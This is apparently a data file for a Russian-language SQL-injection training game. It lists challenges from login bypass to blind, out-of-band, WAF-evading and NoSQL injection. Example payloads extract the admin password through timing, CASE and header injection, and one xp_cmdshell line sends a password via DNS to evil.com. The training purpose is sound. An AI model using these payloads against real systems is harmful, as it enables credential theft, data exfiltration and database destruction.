...
export const sqlChallenges = [
  {
    ...
    description:
      "Войдите в систему без знания реального пароля, используя SQL-инъекцию в форме логина.",
  ...
  },
  {
    ...
    description:
      "Обойдите проверку пароля, используя SQL-комментарий для игнорирования оставшейся части запроса.",
    initialQuery: `SELECT * FROM users\nWHERE username = '[ВВОД]'\n  AND password = 'any'`,
  ...
  },
  {
    ...
    description:
      "Используйте UNION SELECT для извлечения данных из таблицы credit_cards.",
  ...
  },
  {
    ...
    description:
      "Используйте инъекцию для выполнения деструктивной операции — удалите таблицу.",
  ...
  },
  {
    ...
    description:
      "Извлеките информацию о версии базы данных через сообщения об ошибках.",
    initialQuery: `SELECT * FROM users\nWHERE id = '[ВВОД]'`,
  ...
  },
  {
    ...
    description:
      'Определите, существует ли пользователь "admin", используя только ответы true/false от сервера.',
    initialQuery: `SELECT * FROM products\nWHERE name LIKE '%[ВВОД]%'`,
  ...
  },
  {
    ...
    exampleInput:
      "' OR IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a',SLEEP(3),0)--",
    explanation:
  ...
  },
  {
    ...
    description:
      "Извлеките данные через внешний DNS-запрос, когда прямой ответ сервера недоступен.",
    initialQuery: `SELECT * FROM users\nWHERE id = [ВВОД]`,
    hint: "Функция xp_cmdshell (MSSQL) или LOAD_FILE (MySQL) может инициировать DNS-запрос к контролируемому вами домену.",
    exampleInput:
      "1; EXEC xp_cmdshell 'nslookup '+(SELECT TOP 1 password FROM users)+'.evil.com'--",
    explanation:
  ...
  },
  {
    ...
    description:
      "Обойдите Web Application Firewall, используя кодирование и обфускацию SQL-запроса.",
    initialQuery: `SELECT * FROM users\nWHERE username = '[ВВОД]'`,
    ...
    exampleInput:
      "'/*!50000UnIoN*//*!50000SeLeCt*/ 1,2,CHAR(97,100,109,105,110)--",
    explanation:
  ...
  },
  {
    ...
    description:
      "Создайте пейлоад, работающий в MySQL, PostgreSQL и SQLite одновременно.",
    initialQuery: `SELECT * FROM users\nWHERE username = '[ВВОД]'`,
  ...
  },
  {
    ...
    description:
      "Используйте операторы MongoDB ($gt, $ne) для обхода аутентификации в NoSQL базе данных.",
  ...
  },
  {
    ...
    description:
      "Используйте инъекцию в параметре сортировки для извлечения данных через CASE-выражения.",
    ...
    exampleInput:
      "CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' THEN name ELSE email END",
    explanation:
  ...
  },
  {
    ...
    description:
      "SQL-инъекция через HTTP-заголовок, который сервер использует без санитизации.",
    ...
    exampleInput:
      "127.0.0.1', (SELECT password FROM users WHERE username='admin'))--",
    explanation:
  ...
  },
  {
    ...
    description:
      "Используйте инъекцию в HQL-запросе Java/Hibernate приложения для обхода аутентификации.",
  ...
  },
  {
    ...
    description:
      "Используйте инъекцию в INSERT-запросе для создания аккаунта с произвольными правами.",
